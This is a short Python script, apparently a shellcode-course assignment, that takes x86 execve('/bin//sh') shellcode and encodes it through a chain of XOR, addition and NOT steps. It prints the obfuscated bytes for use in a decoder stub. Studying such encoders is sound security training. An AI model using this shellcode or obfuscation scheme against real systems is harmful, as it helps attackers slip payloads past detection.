#!/usr/bin/python
# Python Xanax Encoder 
# SLAE Assignment 4

# Execve Shellcode 
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = ""
encoded2 = ""

# Variables
xor1 = 0xaa
add1 = 0x01
add2 = 0x08 
xor2 = 3

print('Encoded shellcode ...')

for x in bytearray(shellcode):
    # XOR 
    x = x^xor1
    # Add 
    x = x + add1 
    # Not 
    x = ~x 
    x = x & 0xff # Convert to positive 
    # Add2 
    x = x + add2 
    # XOR2 
    x = x^xor2
    
    encoded += '\\x'
    encoded += '%02x' %x
    encoded2 += '0x'
    encoded2 += '%02x,' %x 

print(encoded)
print(encoded2)
print('Len: %d' % len(bytearray(shellcode)))